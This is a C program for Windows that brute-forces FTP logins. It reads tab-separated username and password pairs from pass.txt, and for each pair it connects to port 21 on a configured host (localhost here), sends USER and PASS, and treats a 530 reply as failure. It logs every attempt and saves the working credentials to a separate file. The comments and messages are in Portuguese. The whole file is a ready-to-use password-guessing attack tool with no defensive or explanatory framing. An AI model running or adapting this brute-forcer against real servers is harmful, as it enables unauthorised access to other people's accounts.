#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <synchapi.h>

#include "string_handling.h"

#define HOSTIP "127.0.0.1"
#define DELAY 3

void getUserPassword(int index, char* user, char* pass);
int getPasswordsCount();

int main(int argc, char *argv[]) {
	SOCKET s;
	WSADATA wsa;
	
	if(WSAStartup(MAKEWORD(2, 2), &wsa) != 0){
		fprintf(stderr, "Erro ao inicializar WSA");
		return -1;
	}
	
	struct addrinfo hints;
	memset(&hints, 0, sizeof(hints));
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;
	
	struct addrinfo *addr;
	getaddrinfo(HOSTIP, "21", &hints, &addr);
	
	char *bufferIn = malloc(512);
	char *bufferOut = malloc(512);
	
	char *user = malloc(64);
	char *pass = malloc(64);
	
	char *str_linha = malloc(128);
	
	int quantidade_passwords = getPasswordsCount();
	int i;
	for(i = 0; i < quantidade_passwords; i++){
		s = socket(addr->ai_family, addr->ai_socktype, addr->ai_protocol);
		
		if(s == INVALID_SOCKET){
			fprintf(stderr, "Erro ao criar socket");
			return -1;
		}
		
		if(connect(s, addr->ai_addr, addr->ai_addrlen) != 0){
			fprintf(stderr, "Erro ao tentar conectar");
			return -1;
		}
	
		//MOTD
		memset(bufferIn, 0, 512);
		recv(s, bufferIn, 512, 0);
		printf("%s", bufferIn);
		
		memset(user, 0, 64);
		memset(pass, 0, 64);
		
		getUserPassword(i, user, pass);
		
		printf("\nUsuario: %s\n", user);;
		printf("Password: %s\n\n", pass);
	
		//USER
		memset(bufferOut, 0, 512);
		sprintf(bufferOut, "USER %s\r\n", user);
		send(s, bufferOut, strlen(bufferOut), 0);
	
		memset(bufferIn, 0, 512);
		recv(s, bufferIn, 512, 0);
		printf("%s", bufferIn);
		
		//PASS
		memset(bufferOut, 0, 512);
		sprintf(bufferOut, "PASS %s\r\n", pass);
		send(s, bufferOut, strlen(bufferOut), 0);

		memset(bufferIn, 0, 512);
		recv(s, bufferIn, 512, 0);
		printf("%s", bufferIn);
	
		memset(str_linha, 0, 128);
		strcpy(str_linha, _split(bufferIn, '\n', splitcount(bufferIn, '\n') - 2));
	
		//printf("\n\n%s\n\n", str_linha);
	
		if(strcmp(_split(str_linha, ' ', 0), "530") == 0){
			FILE *arq = fopen("relatorio.txt", "a");
			fprintf(arq, "%s\t%s\t[ACESSO NEGADO]\n", user, pass);
			fclose(arq);
			printf("\n\n[ACESSO NEGADO]\n\n");
		}
		else{
			FILE *arq = fopen("relatorio.txt", "a");
			fprintf(arq, "%s\t%s\t[ACESSO AUTORIZADO]\n", user, pass);
			fclose(arq);
			
			arq = fopen("senhas encontradas.txt", "a");
			fprintf(arq, "%s\t%s\t[ACESSO AUTORIZADO]\n", user, pass);
			fclose(arq);
			
			printf("\n\n[ACESSO AUTORIZADO]\n\n");
		}
	
		closesocket(s);
		
		sleep(DELAY);
	}
	
	WSACleanup();
	
	return 0;
}

int getPasswordsCount(){
	FILE *arq;
	arq = fopen("pass.txt", "r");
	char c;
	int ret = 1;
	while((c = getc(arq)) != EOF){
		if(c == '\n')
			ret ++;
	}
	
	fclose(arq);
	return ret;
}

void getUserPassword(int index, char* user, char* pass){
	FILE *arq;
	arq = fopen("pass.txt", "r");
	char c;
	char* buffer = malloc(64);
	
	memset(buffer, 0, 64);
	
	int linha = 0;
	int caracter_linha = 0;
	while((c = getc(arq)) != EOF){
		if(linha == index){
			if(c == '\n')
				break;
				
			*(buffer + caracter_linha) = c;
			caracter_linha ++;
		}
		
		if(c == '\n')
			linha ++;
	}
	
	fclose(arq);
		
	strcpy(user, _split(buffer, 9, 0));
	strcpy(pass, _split(buffer, 9, 1));
}
